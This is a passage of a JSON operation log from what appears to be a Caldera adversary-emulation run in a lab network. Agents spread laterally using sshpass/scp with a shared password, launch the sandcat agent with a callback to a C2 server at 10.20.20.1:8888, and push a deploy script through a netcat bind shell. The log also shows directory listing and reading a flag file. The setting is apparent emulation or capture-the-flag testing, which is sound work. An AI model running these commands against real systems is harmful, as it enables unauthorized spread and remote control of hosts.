"ssh"], ["22", "ssh"]], "unique": "host.remote.port_services[('8000', 'ssh'), ('22', 'ssh')]", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.156) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:19:59Z"}, {"deadman": false, "finish": "2023-10-09T22:20:19Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "248b069e-335c-450f-b363-0bc4f6b0b494", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux activedir@192.168.200.3:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 activedir@192.168.200.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-09T22:20:17Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "activedir", "unique": "host.lateralMove.useractivedir", "created": "2023-10-09T22:20:16Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.3", "unique": "host.lateralMove.ip192.168.200.3", "created": "2023-10-09T22:20:16Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "22", "unique": "host.lateralMove.port22", "created": "2023-10-09T22:20:16Z", "relationships": []}], "unique": "248b069e-335c-450f-b363-0bc4f6b0b494", "decide": "2023-10-09T22:20:17Z", "status": 1, "score": 15, "pid": "1214", "relationships": [], "host": "intern-host", "pin": 0, "paw": "tubxdc", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-09T22:20:19Z", "command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux activedir@192.168.200.3:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 activedir@192.168.200.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["248b069e-335c-450f-b363-0bc4f6b0b494"], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.3", "unique": "host.ip.address192.168.200.3", "created": "2023-10-09T22:20:19Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:20:19Z"}, {"deadman": false, "finish": "2023-10-09T22:20:34Z", "executor": {"additional_info": {}, "timeout": 30, "variations": [], "payloads": ["runDeployAgent.sh"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "{ echo \"server=#{server}\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s #{host.lateralMove.ip} #{host.lateralMove.port}", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "80eab074-6edb-4ad3-bdbf-3bf3c9f70ec1", "plaintext_command": "{ echo \"server=http://10.20.20.1:8888\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s 192.168.200.3 4444", "used": [{"trait": "host.lateralMove.ip", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.3", "unique": "host.lateralMove.ip192.168.200.3", "created": "2023-10-09T22:20:22Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "4444", "unique": "host.lateralMove.port4444", "created": "2023-10-09T22:20:22Z", "relationships": []}], "unique": "80eab074-6edb-4ad3-bdbf-3bf3c9f70ec1", "decide": "2023-10-09T22:20:22Z", "status": 1, "score": 3, "pid": "1218", "relationships": [], "host": "intern-host", "pin": 0, "paw": "tubxdc", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ncshell", "executors": [{"additional_info": {}, "timeout": 30, "variations": [], "payloads": ["runDeployAgent.sh"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "{ echo \"server=#{server}\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s #{host.lateralMove.ip} #{host.lateralMove.port}", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T9090", "name": "Deception download agent on target through netcat bind shell", "description": "download sandcat agent on a target machine that is listening on a netcat bind shell", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: Netcat Bind Shell"}, "agent_reported_time": "2023-10-09T22:20:29Z", "command": "{ echo \"server=http://10.20.20.1:8888\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s 192.168.200.3 4444", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:20:29Z"}, {"deadman": false, "finish": "2023-10-09T22:20:39Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "a2d69671-022c-49da-ba0b-d784abba28ca", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux hr@192.168.200.6:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 hr@192.168.200.6 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-09T22:20:37Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "hr", "unique": "host.lateralMove.userhr", "created": "2023-10-09T22:20:37Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.6", "unique": "host.lateralMove.ip192.168.200.6", "created": "2023-10-09T22:20:37Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "22", "unique": "host.lateralMove.port22", "created": "2023-10-09T22:20:37Z", "relationships": []}], "unique": "a2d69671-022c-49da-ba0b-d784abba28ca", "decide": "2023-10-09T22:20:37Z", "status": 1, "score": 15, "pid": "1221", "relationships": [], "host": "intern-host", "pin": 0, "paw": "tubxdc", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-09T22:20:39Z", "command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux hr@192.168.200.6:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 hr@192.168.200.6 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["a2d69671-022c-49da-ba0b-d784abba28ca"], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.6", "unique": "host.ip.address192.168.200.6", "created": "2023-10-09T22:20:39Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:20:39Z"}, {"deadman": false, "finish": "2023-10-09T22:20:49Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "b4aa9904-ef55-430c-9b32-03ecc385dd81", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux ubuntu@192.168.200.156:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 ubuntu@192.168.200.156 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-09T22:20:42Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "ubuntu", "unique": "host.lateralMove.userubuntu", "created": "2023-10-09T22:20:42Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.156", "unique": "host.lateralMove.ip192.168.200.156", "created": "2023-10-09T22:20:42Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "8000", "unique": "host.lateralMove.port8000", "created": "2023-10-09T22:20:42Z", "relationships": []}], "unique": "b4aa9904-ef55-430c-9b32-03ecc385dd81", "decide": "2023-10-09T22:20:42Z", "status": 1, "score": 15, "pid": "1225", "relationships": [], "host": "intern-host", "pin": 0, "paw": "tubxdc", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-09T22:20:49Z", "command": "sshpass -p \"ubuntu\" scp -P 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux ubuntu@192.168.200.156:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 ubuntu@192.168.200.156 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["b4aa9904-ef55-430c-9b32-03ecc385dd81"], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.156", "unique": "host.ip.address192.168.200.156", "created": "2023-10-09T22:20:49Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:20:49Z"}, {"deadman": false, "finish": null, "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "021ccbd6-964c-4a40-874f-6fd2e3c747ba", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux ubuntu@192.168.200.156:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 ubuntu@192.168.200.156 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-09T22:20:52Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "ubuntu", "unique": "host.lateralMove.userubuntu", "created": "2023-10-09T22:20:52Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.156", "unique": "host.lateralMove.ip192.168.200.156", "created": "2023-10-09T22:20:52Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "22", "unique": "host.lateralMove.port22", "created": "2023-10-09T22:20:52Z", "relationships": []}], "unique": "021ccbd6-964c-4a40-874f-6fd2e3c747ba", "decide": "2023-10-09T22:20:52Z", "status": -3, "score": 15, "pid": null, "relationships": [], "host": "intern-host", "pin": 0, "paw": "tubxdc", "output": "False", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux ubuntu@192.168.200.156:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 ubuntu@192.168.200.156 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": null}, {"deadman": false, "finish": "2023-10-09T22:21:43Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "3da327cd-130e-4252-802a-4b1e6c4aef56", "plaintext_command": "ls -l /home", "used": [{"trait": "host.dir.path", "links": [], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 4, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-09T22:21:37Z", "relationships": []}], "unique": "3da327cd-130e-4252-802a-4b1e6c4aef56", "decide": "2023-10-09T22:21:37Z", "status": 0, "score": 1, "pid": "1143", "relationships": [{"target": {"trait": "host.dir.children", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["activedir"], "unique": "host.dir.children['activedir']", "created": "2023-10-09T22:21:43Z", "relationships": []}, "source": {"trait": "host.dir.path", "links": [], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 4, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-09T22:21:37Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_contents", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a4afe20>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3449d0>", "score": 1}], "host": "activedir-host", "pin": 0, "paw": "rkzyad", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-ls", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.dir.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.children"}]}], "buckets": ["utility"], "technique_name": "Deception Enum Folders"}, "agent_reported_time": "2023-10-09T22:21:43Z", "command": "ls -l /home", "facts": [{"trait": "host.dir.path", "links": ["fefaaaf8-629b-4c79-b9b1-db6393dba83a", "3da327cd-130e-4252-802a-4b1e6c4aef56", "0be0e5ae-fa60-43a3-a9d6-f19258a67913"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 4, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-09T22:19:01Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])", "host.dir.path(/home) : has_contents : host.dir.children(['activedir'])", "host.dir.path(/home) : has_contents : host.dir.children(['database'])"]}, {"trait": "host.dir.children", "links": ["3da327cd-130e-4252-802a-4b1e6c4aef56"], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": "T9012", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["activedir"], "unique": "host.dir.children['activedir']", "created": "2023-10-09T22:21:43Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['activedir'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:21:43Z"}, {"deadman": false, "finish": "2023-10-09T22:21:51Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "2e733685-7178-4389-8d11-c46d7b5d40de", "plaintext_command": "cat /home/activedir/flag.txt", "used": [{"trait": "host.file.path", "links": [], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/home/activedir/flag.txt", "unique": "host.file.path/home/activedir/flag.txt", "created": "2023-10-09T22:21:47Z", "relationships": []}], "unique": "2e733685-7178-4389-8d11-c46d7b5d40de", "decide": "2023-10-09T22:21:47Z", "status": 1, "score": 1, "pid": "1145", "relationships": [], "host": "activedir-host", "pin": 0, "paw": "rkzyad", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-09T22:21:51Z", "command": "cat /home/activedir/flag.txt", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:21:51Z"}, {"deadman": false, "finish": "2023-10-09T22:22:05Z", "executor": {"additional_info": {}, 